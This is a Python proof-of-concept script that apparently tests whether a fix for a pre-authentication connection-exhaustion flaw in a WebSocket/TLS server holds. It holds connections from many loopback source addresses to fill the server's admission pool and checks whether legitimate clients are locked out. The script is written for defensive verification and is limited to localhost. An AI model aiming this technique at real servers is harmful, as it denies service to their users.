#!/usr/bin/env python3
"""
Live bypass attempt for static review core#1 ("8 idle pre-auth sockets
lock out every new client"), after the fix that gave the Unix socket its
own pool and capped pre-auth connections per source IP
(`tls::Admission::with_per_source`, default 2 per source,
`MAX_UNAUTHENTICATED_TCP` = 32 total). The per-source cap stops *one*
source; it does not stop many sources. This script opens TCP connections
(not even completing the TLS handshake, so it also probes the
`max_handshakes` = 16 concurrent-handshake limit) from enough distinct
127.0.0.x addresses to fill the whole admission pool, holds them, and
then measures whether a legitimate TLS client can still connect -- and
separately confirms the local Unix socket is unaffected (the fixed
part of core#1).

Usage:
    python3 -I preauth_distributed.py --dir <acd config dir> --port <ws port>

Safety: binds only to 127.0.0.0/8 source addresses and connects only to
127.0.0.1:<port> or the Unix socket under <dir>.
"""
import argparse
import os
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import acdws  # noqa: E402


def open_from(src_ip, port, finish_tls, timeout=5.0):
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.bind((src_ip, 0))
    raw.settimeout(timeout)
    raw.connect(("127.0.0.1", port))
    if not finish_tls:
        return raw
    s = acdws.tls_wrap(raw)
    # Finish the WebSocket upgrade (not just the TLS handshake) so the
    # connection actually takes a slot in the post-upgrade `preauth`
    # semaphore (server.rs), which is the pool core#1 found exhaustible.
    # Then send no `hello`, holding the slot until the server's own
    # hello_timeout (5s) or close.
    s.sendall(acdws.ws_handshake_request("127.0.0.1", port))
    headers = acdws.read_http_response_headers(s, timeout=timeout)
    if not headers.startswith(b"HTTP/1.1 101"):
        raise ConnectionRefusedError(headers[:200])
    return s


def try_legit_client(port, token, timeout=5.0):
    t0 = time.time()
    try:
        ws = acdws.WS.connect("127.0.0.1", port, use_tls=True, timeout=timeout)
        ws.send_json(acdws.hello_msg(token))
        msg = ws.recv_json(timeout=timeout)
        ws.close()
        return True, time.time() - t0, msg
    except Exception as e:  # noqa: BLE001
        return False, time.time() - t0, str(e)


def try_legit_local(dir_, timeout=5.0):
    sock_path = os.path.join(dir_, "acd.sock")
    t0 = time.time()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(sock_path)
        req = acdws.ws_handshake_request("localhost", 0, "/")
        s.sendall(req)
        headers = acdws.read_http_response_headers(s, timeout=timeout)
        ok = headers.startswith(b"HTTP/1.1 101")
        s.close()
        return ok, time.time() - t0, headers[:80]
    except Exception as e:  # noqa: BLE001
        return False, time.time() - t0, str(e)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--n-sources", type=int, default=20)
    ap.add_argument("--per-source", type=int, default=2)
    ap.add_argument("--finish-tls", action="store_true",
                     help="complete the TLS handshake on each held socket "
                          "instead of just the TCP connect (tests the "
                          "WS-upgrade pre-auth pool rather than the raw "
                          "handshake-admission pool)")
    args = ap.parse_args()
    token = open(os.path.join(args.dir, "client.token")).read().strip()

    print(f"baseline: legit client connect before attack:")
    ok, dt, info = try_legit_client(args.port, token)
    print(f"  ok={ok} dt={dt:.2f}s info={info if not ok else 'welcome received'}")
    ok2, dt2, info2 = try_legit_local(args.dir)
    print(f"  local socket ok={ok2} dt={dt2:.2f}s")

    sources = [f"127.0.0.{octet}" for octet in range(2, 2 + args.n_sources)]
    stop = threading.Event()

    def refresher(src):
        # The server's hello_timeout (5s) will eventually close an idle
        # pre-hello connection, so each source keeps re-opening its share
        # (core#1's own repro does the same: "reconnect each one every 5s").
        socks = []
        while not stop.is_set():
            while len(socks) < args.per_source and not stop.is_set():
                try:
                    socks.append(open_from(src, args.port, args.finish_tls, timeout=3.0))
                except OSError:
                    break
            time.sleep(0.2)
            socks = [s for s in socks if _alive(s)]
        for s in socks:
            try:
                s.close()
            except OSError:
                pass

    def _alive(s):
        import ssl as _ssl
        try:
            s.setblocking(False)
            data = s.recv(1)
            return data != b""
        except (BlockingIOError, _ssl.SSLWantReadError, _ssl.SSLWantWriteError):
            return True
        except OSError:
            return False
        finally:
            try:
                s.setblocking(True)
            except OSError:
                pass

    print(f"\nsustaining {args.n_sources} x {args.per_source} = "
          f"{args.n_sources * args.per_source} held, refreshed connections from distinct "
          f"sources ({'TLS+WS-upgrade' if args.finish_tls else 'raw TCP, no TLS'}) for 8s:")
    threads = [threading.Thread(target=refresher, args=(src,), daemon=True) for src in sources]
    for t in threads:
        t.start()
    time.sleep(2.0)  # let the pool fill

    print("\nduring attack: legit client connect attempt:")
    ok, dt, info = try_legit_client(args.port, token, timeout=8.0)
    print(f"  ok={ok} dt={dt:.2f}s info={info if not ok else 'welcome received'}")
    ok2, dt2, info2 = try_legit_local(args.dir, timeout=8.0)
    print(f"  local socket ok={ok2} dt={dt2:.2f}s detail={info2}")

    stop.set()
    for t in threads:
        t.join(timeout=5)

    time.sleep(1)
    print("\nafter releasing attacker sockets: legit client connect attempt:")
    ok, dt, info = try_legit_client(args.port, token, timeout=8.0)
    print(f"  ok={ok} dt={dt:.2f}s")


if __name__ == "__main__":
    main()
